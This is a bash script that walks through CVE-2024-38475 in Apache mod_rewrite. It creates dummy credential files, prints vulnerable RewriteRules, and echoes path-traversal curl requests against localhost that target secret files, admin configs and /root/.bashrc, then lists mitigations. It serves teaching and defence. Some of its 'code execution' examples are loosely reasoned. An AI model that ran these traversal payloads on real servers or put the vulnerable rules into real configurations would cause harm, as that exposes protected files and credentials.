#!/bin/bash
# CVE-2024-38475 Demonstration Script
# Apache HTTPD 2.4.59 mod_rewrite vulnerability demonstration

echo "======================================================================"
echo "CVE-2024-38475 - Apache mod_rewrite Vulnerability Demonstration"
echo "Apache HTTP Server 2.4.59 and earlier"
echo "======================================================================"
echo

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}Description:${NC}"
echo "Improper escaping of output in mod_rewrite allows attackers to map URLs"
echo "to filesystem locations that are not intentionally reachable, resulting"
echo "in code execution or source code disclosure."
echo

echo -e "${BLUE}Vulnerability Details:${NC}"
echo "- Affects: Apache HTTP Server 2.4.0 through 2.4.59"
echo "- Module: mod_rewrite"
echo "- Impact: Code execution, source code disclosure"
echo "- CVSS: Not yet rated, but likely High/Critical"
echo "- Fixed in: Apache HTTP Server 2.4.60"
echo

echo -e "${YELLOW}Setting up vulnerable environment...${NC}"

# Create vulnerable directory structure
echo "Creating directory structure..."
mkdir -p /usr/local/apache2/secret 2>/dev/null || echo "Note: Creating directories may require sudo"
mkdir -p /usr/local/apache2/admin 2>/dev/null
mkdir -p /usr/local/apache2/htdocs/scripts 2>/dev/null

# Create test files that should be protected
echo "Creating test files in protected directories..."

# Secret files
cat > /tmp/secret_data.txt << 'EOF'
CONFIDENTIAL INFORMATION
========================
Database Password: super_secret_password_123
API Key: sk-abc123def456ghi789
Admin Token: admin_token_xyz_789
SSH Private Key Location: /root/.ssh/id_rsa
EOF

cat > /tmp/admin_config.php << 'EOF'
<?php
// Admin configuration - SHOULD NOT BE ACCESSIBLE
$admin_password = "admin123456";
$database_host = "127.0.0.1";
$database_user = "root";
$database_pass = "mysql_root_password";
$secret_key = "application_secret_key_abc123";

// This file contains sensitive configuration
echo "Admin panel configuration loaded";
?>
EOF

echo -e "${GREEN}Test files created.${NC}"
echo

echo -e "${YELLOW}Vulnerable Rewrite Rules:${NC}"
echo "The following rewrite rules in vulnerable-httpd-2.4.59.conf demonstrate the vulnerability:"
echo
echo -e "${RED}1. RewriteRule ^/files/(.*)$ /$1 [L]${NC}"
echo "   Allows: /files/../../secret/file.txt -> /../../secret/file.txt"
echo
echo -e "${RED}2. RewriteRule ^/docs/([^/]+)/(.*)$ /$1/restricted/$2 [L]${NC}"
echo "   Allows: /docs/../secret/file.txt -> /../secret/restricted/file.txt"
echo
echo -e "${RED}3. RewriteCond %{QUERY_STRING} path=([^&]+)${NC}"
echo -e "${RED}   RewriteRule ^/redirect$ /%1 [L,R=302]${NC}"
echo "   Allows: /redirect?path=../secret/file.txt -> /../secret/file.txt"
echo

echo -e "${YELLOW}Exploitation Examples:${NC}"
echo "Once Apache is running with the vulnerable configuration, try these URLs:"
echo
echo -e "${RED}Path Traversal Attacks:${NC}"
echo "curl http://localhost/files/../../secret/confidential.txt"
echo "curl http://localhost/files/../admin/config.php"
echo "curl http://localhost/docs/..%2F..%2Fsecret/data.txt"
echo "curl http://localhost/redirect?path=../secret/passwords.txt"
echo

echo -e "${RED}Directory Listing Attacks:${NC}"
echo "curl http://localhost/files/../../"
echo "curl http://localhost/files/../admin/"
echo

echo -e "${RED}Code Execution via Script Access:${NC}"
echo "curl http://localhost/execute/../../../root/.bashrc"
echo "curl http://localhost/execute/../../bin/bash"
echo

echo -e "${YELLOW}Testing the Vulnerability:${NC}"
echo "1. Copy vulnerable-httpd-2.4.59.conf to /usr/local/apache2/conf/httpd.conf"
echo "2. Place test files in the protected directories"
echo "3. Start Apache: sudo /usr/local/apache2/bin/apachectl start"
echo "4. Execute the curl commands above"
echo "5. Observe unauthorized access to protected files"
echo

echo -e "${GREEN}Mitigation:${NC}"
echo "1. Upgrade to Apache HTTP Server 2.4.60 or later"
echo "2. Review all RewriteRule configurations"
echo "3. Avoid using backreferences or variables as first path segment"
echo "4. Use 'UnsafePrefixStat' flag only after ensuring safety"
echo "5. Implement proper input validation in rewrite rules"
echo

echo -e "${BLUE}Additional Security Measures:${NC}"
echo "1. Use absolute paths in rewrite targets when possible"
echo "2. Implement strict directory access controls"
echo "3. Regular security audits of Apache configurations"
echo "4. Monitor logs for suspicious path traversal attempts"
echo "5. Use Web Application Firewalls (WAF) to filter malicious requests"
echo

echo "======================================================================"
echo -e "${RED}WARNING: This demonstration is for educational purposes only!${NC}"
echo -e "${RED}Do not use this configuration in production environments!${NC}"
echo "======================================================================"